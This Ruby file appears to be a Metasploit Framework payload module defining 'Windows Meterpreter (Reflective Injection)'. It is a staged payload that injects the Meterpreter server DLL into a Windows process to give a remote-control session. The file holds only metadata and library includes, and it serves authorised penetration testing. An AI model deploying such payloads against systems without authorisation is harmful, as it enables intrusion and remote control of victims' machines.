##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/payload/windows/meterpreter_loader'
require 'msf/base/sessions/meterpreter_x86_win'
require 'msf/base/sessions/meterpreter_options'

###
#
# Injects the meterpreter server DLL via the Reflective Dll Injection payload
# along with transport related configuration.
#
###

module MetasploitModule

  include Msf::Payload::Windows::MeterpreterLoader
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Windows Meterpreter (Reflective Injection)',
      'Description'   => 'Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged)',
      'Author'        => ['skape', 'sf', 'OJ Reeves'],
      'PayloadCompat' => { 'Convention' => 'sockedi handleedi http https'},
      'License'       => MSF_LICENSE,
      'Session'       => Msf::Sessions::Meterpreter_x86_Win
    ))
  end
end
